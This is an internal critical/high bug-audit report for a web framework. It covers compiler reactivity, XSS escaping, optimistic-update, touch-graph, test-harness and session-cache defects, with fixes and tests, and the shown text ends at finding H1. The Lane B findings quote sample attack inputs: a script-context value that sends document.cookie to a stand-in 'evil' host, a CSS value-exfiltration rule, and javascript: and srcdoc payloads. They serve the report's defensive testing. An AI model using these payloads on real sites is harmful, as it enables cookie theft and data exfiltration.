# Bugs & Testing — Part 4 (Exhaustive critical/high audit)

**Date:** 2026-06-20
**Scope:** A fourth, deeper bug hunt over `packages/*/src`, continuing parts 1–3 (all fixed on `main`).
This pass deliberately goes **deeper** (compiler IR/lowering & reactivity, derivation algebra, touch-graph
extraction completeness, optimistic/query-runtime concurrency, CSRF/session lifecycle, type-soundness,
SSR escaping, streaming) **and into fresh ground** (the conformance test-harness's own soundness, numeric
precision, value round-trip fidelity, the ~30 untouched headless-ui primitives, scaffold/devtool/style
runtime, prototype-pollution, DoS amplification). **Critical/high only.** Every item cites `file:line` and a
concrete reachable scenario.

## How this was produced

A multi-round adversarial sweep: **18 deep finder lanes** read the real implementation, then **two
critic-driven expansion rounds** (8 + 6 more lanes) targeted whatever was still under-covered. **Each
candidate faced an independent exploiter + refuter; every _critical_ additionally faced a third skeptic
tie-breaker.** Only findings that no verifier refuted or marked duplicate are "confirmed." All finders were
primed with the full parts-1–3 do-not-report set, so this reports only **new, distinct** defects.

**176 agents, ~8M tokens. Raw: 66 candidates → 40 confirmed, 21 contested.** Confirmed by verifier-corrected
severity: **8 critical, 30 high, 2 medium.** Two criticals (`F1`/optimistic delta-envelope) were found
independently by two lanes (query-runtime + optimistic-concurrency) and are merged below, so the lanes list
**39 distinct confirmed** items + promoted contested.

## Three headline corrections (read first)

1. **The optimistic apply path corrupts the query store on every prod DELTA response.** The optimistic
   `applyQuery` interposition runs _before_ the delta-merge branch and returns early, so for a `<kovo-query
delta>` chunk the raw delta **envelope** (`{set:…}`/`{lists:…}`) is written into the store as if it were
   the full value, and the rebaser baseline is corrupted. Prod picks delta-vs-full per response, so a normal
   optimistic mutation (addToCart) whose invalidated query returns a delta silently blanks the value.
   → **F1 (critical).**
2. **The framework's own conformance oracle is unsound.** `TRUNCATE`/`MERGE`/`DELETE…USING` parse to zero
   ops and the row-count safety net is gated behind `hasWrite`, so an _uncovered destructive write passes
   `assertCovered()` green_ — the test harness certifies unsound invalidation as covered. → **E1 (critical).**
3. **CTE-prefixed writes vanish from the touch graph.** `db.with(cte).update(t)…` records **no** touch edge
   **and no KV406** (the receiver is a `CallExpression`, rejected by the write extractor while `with` is a
   "classified" method), so any query reading that domain stays stale with nothing to gate it — and it also
   blinds the part-3 KV414 write-side IDOR audit. → **D1 (critical).**

---

## Execution status — IMPLEMENTED (2026-06-21)

All confirmed findings (7 critical, 30 high, 2 medium) plus the promoted/cheap-contested items are
implemented with red→green tests in worktree `../kovo-part4-impl` (branch `agent/bugs-part4-impl`, off
current `main` — the compiler-refactoring line; the part-3/I2 code is present, so all findings applied),
built by 14 file-disjoint sub-agent lanes + a central pass, each lane committed as it landed (to survive a
mid-run shared-worktree `git reset`). **Final gates (all green):** `tsc --noEmit` 0 errors; full unit suite
**3570 passed / 3 skipped / 0 failed (442 files)**; `api-surface-gate` clean (1338 = baseline, 0 boundary
violations); duplicate-export check clean; `git diff --check` clean. (The 2 `import-boundary` warnings —
`site/scripts` / `examples/stackoverflow` importing `@kovojs/compiler/package-styles` — are pre-existing on
`main`, exit 0.)

**Done — all confirmed criticals/highs:** A1, A2, A3 · B1, B2 · C1–C6 · D1, D2 · E1, E2, E3 · F1, F2, F3,
F5 (+ L8-2) · G1, G2 · H1 · I1 (+ L13-1, L13-3) · J1–J5 · K1, K2, K3 · L1, L2, L3, L4, L5 · M1, M2. **Plus
cheap-contested done:** SCHEMA-1, SCHEMA-2, L10-1, L16-2, L-i18n-meta-1 (og:image scheme-check),
L2-protopollution-1 (query-delta `__proto__` own-property). Intended behavior-change goldens were inverted
(gallery-merge / idref-oracle / ui-inputs / gallery fixtures for J1/J3/J5; `loader-visible-return-refetch`
for F5).

**Deferred (documented, not silently dropped):**

- **F4 broadcast leg** — the rollback-to-stale-baseline fix is done at the rebaser level (baseline refreshes
  on `applyServerTruth`) and the refetch ingress is routed through it (L8-2); routing the **BroadcastChannel**
  receive path (`broadcast.ts` writes the store directly) through the rebaser needs threading the rebaser hook
  into the loader's broadcast install — a follow-up.
- **L7-1 / L7-2 / L7-3** (wire-parser robustness) — touch `wire-response-scanner.ts` + the minified
  `inline-loader` (regen risk); reachability debated. **L8-3** (per-key recency guard) — needs a
  `QueryStore.set` signature change rippling through callers.
- **L15-1 / L15-2** (incremental-cache absent-field dependency / 32-bit fact-hash) — the fact-invalidation
  machinery was largely removed by the in-progress compiler-refactoring (FN3) on this main; re-assess against
  the refactored cache first.
- **L17-2** (per-island AbortController leak), **L2-numeric-2 / L2-numeric-3** (exact-numeric punt / NaN
  guard — need cross-file column-exactness facts), **OFM-2** (bare-`open` non-modal dialog — needs a runtime
  `showModal()` hook), the **inline-loader `sfail()`** half of I1 (minified generated file), and
  **shipped-`@kovojs/ui` forwarding** of the new `aria-modal`/`aria-activedescendant` (J3/J5 primitive-level
  done; the `ui/dialog.tsx`/`ui/select.tsx` attr forwarding is a follow-up) — all contested/larger.

> Original audit definition-of-done (retained): the cited test goes **red against today's code, green after
> the fix**; bug-codifying tests were inverted.

## Summary (confirmed + promoted, by lane)

| Lane  | Theme                                         | Crit | High |
| ----- | --------------------------------------------- | ---- | ---- |
| **A** | Compiler lowering & reactivity soundness      | 1    | 2    |
| **B** | SSR contextual escaping (XSS / CSS-injection) | 1    | 1    |
| **C** | Derivation algebra & numeric coercion         | —    | 6    |
| **D** | Touch-graph extraction completeness           | 1    | 1    |
| **E** | Conformance test-harness soundness (meta)     | 1    | 2    |
| **F** | Optimistic & query-runtime correctness        | 1    | 4    |
| **G** | Auth, session & shared-cache posture          | 1    | 1    |
| **H** | Type-system soundness                         | —    | 1    |
| **I** | Streaming & deferred                          | —    | 1¹   |
| **J** | headless-ui a11y & primitives                 | —    | 5²   |
| **K** | Node adapter, resource exhaustion & DoS       | —    | 3    |
| **L** | Error disclosure & value round-trip           | —    | 5²   |
| **M** | Storage, schema-parse & build                 | 1    | 1    |

¹ one medium (forgeable deferred boundary) triaged with this lane. ² includes items promoted from _Contested_
(exploiter-confirmed). Remaining contested (16) are triaged in their own section.

---

## Lane A — Compiler lowering & reactivity soundness _(`compiler/src/scan/parse.ts`, `lower/{handlers,structural-jsx,inline-derives}.ts`)_

- [x] **A1 (critical) — Element-access reads of queries/state evade dependency tracking → derive references an unbound query (runtime crash) and never refreshes (silent staleness)** `impl-bug` (L1-1)
  - **Where:** `scan/parse.ts:640-646` (`propertyAccessReceiverSegments` returns null for element-access receivers) + `:1086-1115` (`propertyAccessPathModels` visits only `PropertyAccessExpression`); `lower/structural-jsx.ts:1146-1173`/`1223-1237` (single-root classification) + `:554-556` (derive emit with only declared inputs).
  - **Defect:** a binding/derive reading a query/state via **computed/element access** (`rows[i].name`, `rows[0].name`) produces zero detected paths. `<p>{rows[state.i].name}</p>` (queries `{rows}`, state `{i}`) compiles with **no diagnostic** to `derive(["state"], (state) => rows[state.i].name)` — `rows` is unbound (ReferenceError on every state change) **and** the `rows` query dependency is dropped (never re-runs → stale). §4.9 exhaustiveness is bypassed because KV407/coverage operate over _declared inputs_, not reachable identifiers in derive bodies.
  - **Fix:** walk `ElementAccessExpression` receivers in `propertyAccessPathModels` so every reactive root is seen (→ correct multi-root derive inputs, or a diagnostic if multi-query is unsupported). Backstop: validate every free identifier in a generated derive body is bound (param/import/`state`), error otherwise.
  - **Test:** compile `<span title={meta.label + rows[0].name}>` (queries `{rows,meta}`) → assert diagnostics non-empty OR the derive declares both `meta` and `rows`; and `<p>{rows[state.i].name}</p>` → derive does not reference an unbound `rows`.
  - **Verified:** exploiter + refuter + skeptic all reproduced the unbound/stale emission with `diagnostics=[]`.

- [x] **A2 (high) — Two handler element-params sharing a terminal property name collapse to one `data-p-*` attribute and one `ctx.params` slot → handler silently gets the wrong argument** `spec-impl-divergence` (L1-2)
  - **Where:** `lower/handlers.ts:390-397` (attribute name from terminal name only) + `:482-491` (dedupe keys on expression, never the attribute name); `emit/client.ts:176-194`; `emit/server.ts:1850`.
  - **Defect:** `onClick={() => swap(item.id, item.parent.id)}` emits `data-p-id="{item.id}" data-p-id="{item.parent.id}"` (browser keeps the first) and client `swap(ctx.params.id, ctx.params.id)` — both args resolve to the first. No KV231. Extremely common: `swap(a.id,b.id)`, `move(from.index,to.index)`. §4.3 mandates KV231 for a colliding `data-p-*`.
  - **Fix:** key dedupe/uniquification on the attribute name; derive the param name from the full path (`parent_id`) or emit KV231.
  - **Test:** compile `swap(item.id, item.parent.id)` in a list → server has no duplicate `data-p-id`, client args map to distinct params, or KV231.
  - **Verified:** exploiter + refuter reproduced the duplicate attribute + collapsed `ctx.params.id`.

- [x] **A3 (high) — Static object spread bypasses KV236 URL-scheme / output-context validation (stored XSS)** `spec-impl-divergence` (L2-keyed-structural-1)
  - **Where:** `lower/structural-jsx.ts:233-245` (`lowerPrimitiveSpreads`) + `:1468-1501`; `security/output-context.ts:71-167` (`validateElementAttributes` iterates only `element.attributes`, never expands `spreadAttributes`).
  - **Defect:** `<a {...{ href: "javascript:alert(1)" }}>x</a>` compiles with **`diagnostics===[]`** and emits `<a href="javascript:alert(1)">`, whereas the direct attribute form correctly raises KV236. Same bypass for every URL sink and the raw-HTML set (`dangerouslySetInnerHTML`/`innerHTML`/`srcdoc`). The spread-injected value is served verbatim → stored/reflected XSS the part-1 KV236 fix was meant to block. (Finder said critical; verifiers set high — requires an app to spread a static literal into a sink.)
  - **Fix:** run output-context validation over static-spread object entries before/as they lower (expand `spreadAttributes[].objectEntries` through `validateUrlAttribute`/`validateRawHtmlAttribute`/the `on*`/`srcdoc` checks), or emit KV236 from `lowerPrimitiveSpreads`.
  - **Test:** compile `<a {...{ href:"javascript:alert(1)" }}>` and `<iframe {...{ srcdoc:"<script>…" }}/>` → KV236 (currently `[]`).
  - **Verified:** exploiter + refuter + skeptic all reproduced `diagnostics===[]` for the spread vs `["KV236"]` for the direct form.

---

## Lane B — SSR contextual escaping _(`compiler/src/security/output-context.ts`, `lower/structural-jsx.ts`; `server/src/html.ts`)_

- [x] **B1 (critical) — Dynamic `<script>` element text is XSS: no KV236, silently wrapped in `escapeText` (wrong encoder for JS context)** `spec-impl-divergence` (L11-1)
  - **Where:** `lower/structural-jsx.ts:1034-1068` (`escapeStaticTextInterpolations` — no element-tag gate); `security/output-context.ts:28-167` (validates only attributes, never element text); `server/src/html.ts:88-96` (`escapeText` escapes only `&<>`).
  - **Defect:** `<script>{cfg.inline}</script>` (cfg from a query) compiles with **zero diagnostics** to `<script>{escapeText(cfg.inline)}</script>`. `escapeText`'s `&<>` escaping is meaningless in JS context: `cfg.inline = "x';fetch('//evil/'+document.cookie)//"` (no `&<>`) executes verbatim → arbitrary JS / cookie theft on first paint (server stored-XSS). §4.8 names `<script>` element text an unsafe context that must be KV236 unless `trustedHtml`.
  - **Fix:** add a security pass over JSX element **text** children: dynamic, non-`trustedHtml` text inside `script`/`style` raises KV236; stop `escapeText`-wrapping rawtext elements (it is unsound).
  - **Test:** compile `<div><script>{cfg.inline}</script></div>` → KV236 (currently `[]`); `trustedHtml(cfg.inline)` suppresses.
  - **Verified:** exploiter + refuter + skeptic reproduced `KV236 count 0` + the `escapeText`-wrapped `<script>` emission.

- [x] **B2 (high) — Dynamic `<style>` element text is CSS-injection: no KV236, silently wrapped in `escapeText`** `spec-impl-divergence` (L11-2)
  - **Where:** same pass gap; `security/output-context.ts:267-290` (`validateComponentCssText` checks only `css:`/`styles:` option text, never `<style>` element text or dynamic values).
  - **Defect:** `<style>{data.css}</style>` compiles with zero diagnostics; `escapeText` is the wrong encoder in RAWTEXT (entities aren't decoded inside `<style>`). Reachable CSS injection → attribute-value exfiltration (`input[value^=a]{background:url(//evil/a)}`), clickjacking, `url(javascript:…)`. The style _attribute_ path is gated; the `<style>` _element_ path is not.
  - **Fix:** same pass as B1 (KV236 for dynamic `<style>` element text; don't `escapeText`-wrap).
  - **Test:** `<div><style>{data.css}</style></div>` → KV236 (currently `[]`).
  - **Verified:** exploiter + refuter reproduced `KV236 count 0` + `escapeText`-wrapped `<style>`.

---

## Lane C — Derivation algebra & numeric coercion _(`drizzle/src/derive.ts`, `derive-codegen.ts`, `static.ts`; `core/src/derivation.ts`)_

The optimistic-derivation grammar's filtered-aggregate and numeric paths are unsound (the "wrong prediction
is worse than none" contract, §10.5:1166). Six distinct silent-wrong-output bugs.

- [x] **C1 (high) — Filtered `SUM` ignores rowset filters on INSERT/UPDATE — `inc`/`resum` add rows not in the filtered set** `impl-bug` (L3-1)
  - **Where:** `drizzle/src/derive.ts:204-241` (`deriveSum` never inspects `field.rowset.filters`); filters built at `static.ts:10985-11008`. The C4 fix (`rowsPath = field.pred ? undefined : …`) was applied only to COUNT.
  - **Defect:** `SUM(amount) WHERE status='active'`; INSERT `{amount:50,status:'pending'}` emits `inc by 50` (or `resum` over the _unfiltered_ sibling witness) → optimistic total wrong.
  - **Fix:** evaluate the inserted/updated row against `rowset.filters` — no-op if provably excluded, punt if undecidable; gate the resum-over-witness path on the witness matching the SUM's filters.
  - **Test:** `derive.test.ts` — filtered SUM + INSERT of a non-member row → punt/no-op (currently `inc by 50`).
  - **Verified:** exploiter + refuter reproduced the `inc`/`resum`.

- [x] **C2 (high) — Filtered AGG pushes INSERTed rows that violate the rowset filter — optimistic list shows rows that vanish on reconcile** `impl-bug` (L3-2)
  - **Where:** `derive.ts:116-141` (deriveAgg INSERT/UPSERT branch unconditionally `push-row`); membership only handled for UPDATE (`:163-182`).
  - **Defect:** list `WHERE status='active'`; INSERT `{status:'pending'}` is pushed into the active list → row appears then disappears on server truth. §10.5:1162 membership-entry rule.
  - **Fix:** evaluate `effect.values` against `rowset.filters` in the insert branch (push if satisfied, no-op if violated, punt if undecidable) reusing `membershipTransition`.
  - **Test:** filtered AGG + INSERT non-member → no push/punt.
  - **Verified:** exploiter + refuter reproduced the `push-row`.

- [x] **C3 (high) — `COUNT` with multiple-eq or non-eq filters mis-derives (only the first eq becomes the pred; non-eq → recount over unfiltered witness)** `impl-bug` (L3-3)
  - **Where:** `static.ts:11114-11116` (`pred = rowset.filters.find(op==='eq')`); `derive.ts:245-276`.
  - **Defect:** (1) `count() WHERE and(eq(a,X),eq(b,Y))` keeps only `a=X` → INSERT `{a:X,b:Z}` over-counts; (2) `count() WHERE gt(price,100)` → `pred=undefined` → recount over the unfiltered witness (re-opens C4 for non-eq).
  - **Fix:** carry the full filter chain (AND of filters) or punt when >1 decidable column / any non-eq; never recount an unfiltered witness for a non-eq predicate.
  - **Test:** multi-eq INSERT mismatch → no-op; non-eq + witness INSERT → punt.
  - **Verified:** exploiter + refuter reproduced both paths.

- [x] **C4 (high) — `count(t.col)` classified as `COUNT(*)` — counts rows where the column is NULL (over-count)** `spec-impl-divergence` (L3-4)
  - **Where:** `static.ts:11111-11117` (discards `expression.getArguments()`); `derive.ts:245-276`.
  - **Defect:** Drizzle `count(t.assignee)` counts non-NULL values; the deriver treats it as `count(*)`, so INSERT with `assignee=NULL` emits `inc by 1` / recounts the NULL row → optimistic over-count flicker.
  - **Fix:** inspect the count argument — model the non-NULL constraint as an implicit pred or punt (`opaque-projection`).
  - **Test:** `count(t.assignee)` + INSERT `{assignee:null}` → no-op/punt (currently `inc by 1`).
  - **Verified:** exploiter + refuter reproduced.

- [x] **C5 (high) — Codegen optimistic transforms use raw `+`/`?? 0` with no numeric coercion; interpreter uses `asNumber` — string-serialized decimal/bigint columns string-concatenate into corrupt totals** `spec-impl-divergence` (L2-numeric-1)
  - **Where:** `drizzle/src/derive-codegen.ts:120` (inc), `:126-127` (resum), `:158-161` (position compare) vs interpreter `core/src/derivation.ts:412`/`443-446`/`483-487`.
  - **Defect:** node-postgres serializes `numeric`/`decimal`/`bigint` as **strings**. The **shipped** path is codegen: `resum` does `0 + "19.99"` = `"19.99"` then `"19.99" + "5"` = `"19.995"` (string concat) → garbage total. Interpreter yields `24.99` → the two lowerings disagree, violating the §10.5:1172 commuting diagram, and the production lowering is the wrong one.
  - **Fix:** make codegen coerce exactly as the interpreter (`Number(...)`/shared `n()` helper); keep both identical. (See C6; better still, punt exact-numeric columns.)
  - **Test:** `derive-codegen.test.ts` parity — codegen result === interpreter result for string-decimal inputs (currently `"100.502"` vs number).
  - **Verified:** refuter reproduced the string-concat (exploiter's verdict lost to a transient rate-limit; refuter confirmed independently).

- [x] **C6 (high) — `inc` interpreter resets a string/decimal-valued SUM base to 0 (`typeof current==='number'?current:0`) while codegen keeps it — silent loss of the existing total** `spec-impl-divergence` (L2-numeric-4)
  - **Where:** `core/src/derivation.ts:411` vs codegen `derive-codegen.ts:120`.
  - **Defect:** when the held SUM is a string (PG numeric/decimal/bigint), `inc by qty` yields just `qty` (existing total discarded) → the cart subtotal collapses to the just-added line amount. Codegen and interpreter again disagree.
  - **Fix:** `const base = asNumber(current)` (and apply the matching codegen fix from C5 so both agree).
  - **Test:** `applyPatchProgram` `inc {by:5}` over base `{total:'100.50'}` → `105.5` (currently `5`).
  - **Verified:** exploiter + refuter reproduced against the shipped compiled interpreter.

---

## Lane D — Touch-graph extraction completeness _(`drizzle/src/static.ts`, `invalidation.ts`)_

- [x] **D1 (critical) — CTE-prefixed writes (`db.with(cte).insert/update/delete(t)`) are silently dropped from the touch graph with no touch edge and no KV406** `impl-bug` (L4-1)
  - **Where:** `static.ts:1650-1689` (`extractProjectDrizzleWriteCalls`), `:2094-2117` (`isProjectDrizzleReceiverIdentifier` rejects `CallExpression` receivers), `:120` (`with` is a classified method so no KV406); contrast the read side `:5588-5596` which _does_ walk through `CallExpression` receivers.
  - **Defect:** `db.with(cte).update(products).set(…).where(eq(products.id,id))` — the write's receiver is the call `db.with(cte)`, rejected → the write is `continue`d, recording **nothing** (no touch, no read, no KV406). A query reading `product` stays stale after the mutation, and CI can't catch it (no diagnostic). The same blindness defeats the part-3 KV414 write-side IDOR audit for CTE writes.
  - **Fix:** resolve the write receiver through chained `.with()` (reuse `queryCallChainReceiver`), or fail-closed with KV406 on an unresolved `CallExpression` receiver.
  - **Test:** `extractTouchGraphFromProject` on `db.with(cte).update(products)…` → `touches` contains `{domain:'product', via:'products', keys:'arg:id'}` (currently the fn is absent). Add `.with(cte).insert/delete`.
  - **Verified:** exploiter + refuter + skeptic reproduced the empty graph; the non-CTE equivalent yields the touch.

- [x] **D2 (high) — Multi-level FK `CASCADE` chains leave transitively-deleted domains un-invalidated (cascade fan-out is one hop only)** `coverage-gap` (L4-2)
  - **Where:** `static.ts:6184-6214` (`appendForeignKeyCascadeWriteSummaries` — direct children only, no recursion).
  - **Defect:** with `a→b→c` (both `ON DELETE CASCADE`), `db.delete(a)` deletes a, b, **and** c in the DB, but the touch graph records only a's and b's domains → a query reading `c` stays stale.
  - **Fix:** compute the cascade fan-out as a transitive closure/fixpoint (follow each cascade child's own cascade FKs; track visited for cycles). `set null`/`set default` stay terminal.
  - **Test:** 3-table cascade chain + `db.delete(a)` → touches include `cdom`; add an FK-cycle termination case.
  - **Verified:** exploiter + refuter reproduced `touches=['adom','bdom']` (cdom missing).

---

## Lane E — Conformance test-harness soundness _(`packages/test/src/verifier-sql.ts`, `verifier-observation.ts`, `sql-observer.ts`)_

The oracle that is supposed to catch Lane-D-class escapes is itself unsound — these are **meta-soundness**
bugs: a real touch-graph escape passes the conformance gate green.

- [x] **E1 (critical) — Unrecognized write statements (`TRUNCATE`/`MERGE`/`DELETE…USING`) drop to `[]` and the row-count safety net is gated off, so an uncovered destructive write passes `assertCovered()` green** `impl-bug` (E-harness-1)
  - **Where:** `verifier-sql.ts:47-49` (default `return []`); `verifier-observation.ts:111-120` (count net gated by `hasWrite`); `sql-observer.ts:18-22` (parse-error → `[]`, fail-open).
  - **Defect:** `truncate products` parses to `{type:'truncate table'}` → default → zero ops; `DELETE…USING`/`MERGE` throw → caught → `[]`. The count-delta backstop only runs when `hasWrite` is true, so it never fires → `assertCovered()` finds nothing uncovered → **green** for a full-table wipe with no declared touches. The harness certifies unsound invalidation as covered.
  - **Fix:** add a `truncate table` case (write op per table); make the row-count backstop **unconditional** (always snapshot/compare counts); treat parse failure as fail-closed for the count net.
  - **Test:** wrap a pglite db, `db.sql('truncate products')` with `domainByTable:{products:'product'}` → `assertCovered()` throws KV40x (currently does not).
  - **Verified:** refuter + skeptic reproduced the green pass.

- [x] **E2 (high) — `INSERT … ON CONFLICT DO UPDATE SET col=(subquery)` drops the conflict-clause subquery reads, masking a KV407 escape** `impl-bug` (E-harness-2)
  - **Where:** `verifier-sql.ts:79-92` (`operationsForInsert` ignores `statement.onConflict`).
  - **Defect:** the conflict-update subquery's `FROM` tables are never walked → a cross-domain read in `.onConflictDoUpdate({set:…})` is invisible → covered-green despite the touch graph omitting it.
  - **Fix:** pass `statement.onConflict` through `operationsForNestedStatements`/`markMutationReads`.
  - **Test:** `insert … on conflict … do update set price=(select amount from prices …)` → `assertCovered()` throws KV407 `price`.
  - **Verified:** exploiter + refuter reproduced the dropped read.

- [x] **E3 (high) — `RETURNING (subquery)` on INSERT/UPDATE/DELETE drops the returning-clause reads, masking KV407 coverage** `impl-bug` (E-harness-3)
  - **Where:** `verifier-sql.ts:79-123` (none of the DML handlers pass `statement.returning`).
  - **Defect:** `.returning()` with a scalar/correlated subquery reads other tables that are never recorded → covered-green; also lets an owner-table read hide in RETURNING and evade KV407.
  - **Fix:** walk `statement.returning` (as mutation reads) in each DML handler.
  - **Test:** `update products … returning (select amount from prices)` → throws KV407 `price`.
  - **Verified:** exploiter + refuter reproduced the dropped read.

---

## Lane F — Optimistic & query-runtime correctness _(`browser/src/{optimism,mutation-optimistic,query-apply,query-refetch}.ts`)_

- [x] **F1 (critical) — Optimistic `applyQuery` interpose writes the raw prod DELTA envelope into the store as the full value (delta-merge bypassed); rebaser baseline corrupted** `impl-bug` (L8-1 + L9-1, independently found)
  - **Where:** `query-apply.ts:52-73` (interpose short-circuits before the `if (query.delta)` branch); `mutation-optimistic.ts:147-152` (hook is unconditional, passes `query.value`); `optimism.ts:188-224` (`applyServerTruth` stores `value` verbatim). Server emits delta chunks by default (`mutation.ts:1106`).
  - **Defect:** for a `<kovo-query delta>` chunk, `query.value` is a `QueryDelta` envelope (`{set:…}`/`{lists:…}`), not the merged value. The interpose returns it as-is → the store holds `{set:{count:6}}` instead of `{count:6,items:[…]}`; every binding renders blank, the held base for future deltas is garbage, and `#serverTruthByQuery` is corrupted — permanent silent-wrong-output until a full refetch. Fires on any prod optimistic mutation whose invalidated query is delta-eligible (the steady-state encoding).
  - **Fix:** make the optimistic hook delta-aware — `applyQueryDelta(store.get(name,key), query.value)` (try/catch → `onDeltaMiss`) and pass the **merged** value to `applyServerTruth`; or move the delta-merge before the interpose so any interposer always sees the full value.
  - **Test:** base `{count:5,items:[]}` + pending +1; apply `{delta:true, value:{set:{count:6}}}` → `store.get('cart')` deep-equals `{count:6,items:[]}` (currently `{set:{count:6}}`).
  - **Verified:** **both lanes** (query-runtime + optimistic-concurrency), each exploiter + refuter + skeptic, reproduced the raw-envelope store write via the public submit API.

- [x] **F2 (high) — A throwing transform during rebase freezes the stale prediction on screen and corrupts the rebaser baseline (server truth dropped)** `impl-bug` (L9-2)
  - **Where:** `optimism.ts:188-224` (`applyServerTruth` resets `#serverTruthByQuery` to new truth _then_ re-applies survivors, store write last at `:223`); `:317-325` (`applyOptimisticTransform`, no try/catch); `query-apply.ts:86-98` (reports-and-continues with `onError`).
  - **Defect:** a survivor transform that throws during re-apply (reachable: transform does `draft.items.push(…)` but a concurrent delete made truth `{items:null}`) leaves the store on the **old** prediction while `#serverTruthByQuery` holds the **new** truth → permanent desync, and the arriving server truth is discarded (the prediction is presented as authoritative — violates §10.4:1129).
  - **Fix:** make `applyServerTruth` fault-atomic — write settled server truth first, then attempt re-apply; on a transform throw, drop that pending (KV313), report, continue; never leave the store on the pre-truth prediction.
  - **Test:** truth `{items:null}` arriving while a `items.push` transform is pending → no throw, store = `{items:null}`.
  - **Verified:** exploiter + refuter reproduced via the `onError`-threaded path.

- [x] **F3 (high) — A transform that throws on ENQUEUE orphans a pending-log entry that permanently breaks all future rebases of that query** `impl-bug` (L9-3)
  - **Where:** `optimism.ts:129-148` (`addChange` records pending at `:139-140` _before_ applying at `:142-146`); `mutation-optimistic.ts:56` (`addChange` outside any try/catch).
  - **Defect:** if the transform throws on enqueue (store value undefined/wrong shape), the pending entry is already recorded but never settled (the mutation never sends). Every subsequent `applyServerTruth` for that query re-runs the throwing transform and throws again → permanent corruption of that query's reconciliation for the document's lifetime.
  - **Fix:** apply to a local first (try/catch); only record pending + write store on success; on throw restore earlier writes in the same call, report KV313, don't record.
  - **Test:** unseeded store + `add` whose transform does `d.count+=1` → after, `pendingCount('cart')===0` (currently 1, and a later `applyServerTruth` re-throws).
  - **Verified:** exploiter + refuter reproduced the orphan (`pendingCount==1`).

- [x] **F4 (high) — Failed optimistic mutation rolls back to a STALE rebaser baseline, silently reverting a concurrent same-user broadcast/refetch server truth (data loss)** `impl-bug` (L9-4)
  - **Where:** `optimism.ts:129-148` (baseline captured once, never refreshed by external writes); `:162-186` (`settleWithoutServerTruth` re-derives from the frozen baseline); `broadcast.ts:157-176` + delta-miss refetch write the store directly, _not_ through the rebaser.
  - **Defect:** m1 +1 pending (baseline=0, store=1); a concurrent broadcast applies the other tab's committed `{count:100}` (store=100, baseline still 0); m1 fails → rollback re-derives store = baseline(0) → **destroys the committed 100**. The user's cart reverts to a value that is neither prediction nor truth.
  - **Fix:** route external server-truth writers (broadcast/refetch) through the rebaser so they refresh the baseline + re-apply pending; or on rollback restore against current-store-minus-own-delta; or force a refetch on out-of-band change.
  - **Test:** baseline 0, store→100 (broadcast), `settleWithoutServerTruth('m1')` → store ≠ `{count:0}`.
  - **Verified:** exploiter + refuter reproduced the destroyed broadcast truth.

- [x] **F5 (high) — Keyed-query `/_q` refetch builds the wrong URL (canonical instance key as path, no args) → server 404 → silent stale data + broken deploy-skew recovery** `spec-impl-divergence` (L2-prefetch-1)
  - **Where:** `query-refetch.ts:97` (`"/_q/"+encodeURIComponent(query)`), `:185-197` (passes `queryWireKey(name,key)`); `query-store.ts:123-127` (`name:keyValue`); server `query.ts:404` (exact `q.key === decoded`).
  - **Defect:** for a keyed query the refetch issues `GET /_q/product%3Ap1` with no args; the server registers by query **name** (`product`), so this never matches → **404**. Every delta-miss recovery, cross-tab broadcast refetch, and visible-return refetch of a keyed query silently fails → the stale base is never replaced (§14:1430 "a refetch from an in-window document MUST NOT 404").
  - **Fix:** split the wireKey into `{name, keyValue}`, build `/_q/${name}` + args as search params (carry the args or the server-computed `/_q` href per instance). Add a real-server integration assertion.
  - **Test:** drive `createDeltaMissRefetcher`/visible-return for a keyed query against real dispatch → 200 + base replaced (currently 404).
  - **Verified:** exploiter + refuter reproduced the `/_q/recommendations%3Auser-1` 404.

---

## Lane G — Auth, session & shared-cache posture _(`better-auth/src/session.ts`, `server/src/{guards,app-document,mutation}.ts`)_

- [x] **G1 (critical) — Rolling-session `Set-Cookie` emitted on unguarded, cacheable document GETs → cross-principal session-token leak via shared cache (session fixation/takeover)** `impl-bug` (L2-better-auth-1)
  - **Where:** `better-auth/src/session.ts:56-85` (forwards refresh `Set-Cookie` unconditionally); `guards.ts:399-419` (sessionProvider runs on every route, forwards via `onSessionSetCookie`); `route.ts:838-839` (runs regardless of guard); `app-document.ts:76-110` (appends cookies; sets `noStore` **only when `route.guard` is defined**); `document-core.ts:288-289` (`no-store` only when `noStore`).
  - **Defect:** with Better Auth rolling sessions (default `updateAge`) or `cookieCache`, an authenticated user loading an **unguarded** route (the public `/`) gets a response carrying `Set-Cookie: better-auth.session_token=<their token>` but **no `Cache-Control: no-store`**. A shared CDN/proxy caches the response _including_ the `Set-Cookie` and replays it to other anonymous visitors → account takeover / fixation. (This is the _new_ consequence of part-3's I2 wiring: the refresh cookie now actually rides the response — and a cacheable unguarded one leaks it.)
  - **Fix:** force `no-store` whenever `refreshSetCookies.length > 0`, independent of `route.guard` (`noStore = route.guard !== undefined || refreshSetCookies.length > 0`); or have the cookie sink mark the document session-dependent.
  - **Test:** unguarded route + provider returning `{value, setCookies:['…session_token=tok…']}` → response has `Cache-Control: no-store` (red today) + the cookie; plain-value provider stays cacheable.
  - **Verified:** exploiter + refuter + skeptic confirmed (the part-3 app-document.test.ts:485 case already shows the cookie emitted with `route.guard` undefined and no `no-store`).

- [x] **G2 (high) — No-JS mutation path runs the guard chain (and replay reservation) BEFORE CSRF validation** `spec-impl-divergence` (L5-1)
  - **Where:** `mutation.ts:1297-1356` (`renderNoJsMutationResponse`: guard `:1318`, replay reserve `:1347`, CSRF only inside `runMutation` `:583`); contrast the wire path `:719-736` (CSRF first).
  - **Defect:** CSRF is validated _after_ the guard chain and replay reservation on the no-JS path (reachable by any POST to `/_m/<key>` without the fragment header). A stateful `guards.rateLimit` increments on every CSRF-invalid POST → an attacker with **no** CSRF token exhausts the victim's rate-limit budget; replay slots are occupied pre-CSRF. §6.6:735 / §10.3:1064 require CSRF before parse/replay/guards.
  - **Fix:** hoist CSRF validation to the top of `renderNoJsMutationResponse` (mirror `:719-736`) before the guard lifecycle and any reserve.
  - **Test:** `csrf.test.ts` — no-JS mutation, invalid token, counting guard + throwing replay store → guard counter stays 0, store untouched, 422 CSRF (currently guard runs).
  - **Verified:** exploiter + refuter reproduced (a probe showed the guard runs once and returns 429 with CSRF never validated).

---

## Lane H — Type-system soundness _(`core/src/index.ts`, `compiler/src/lower/navigation.ts`, `server/src/match.ts`)_

- [x] **H1 (high) — Typed link/href/redirect builders use a narrower param-name grammar than the type extractor + runtime matcher: a type-correct link with a hyphen/dot param name silently drops the value and emits a wrong URL** `spec-impl-divergence` (L6-1)
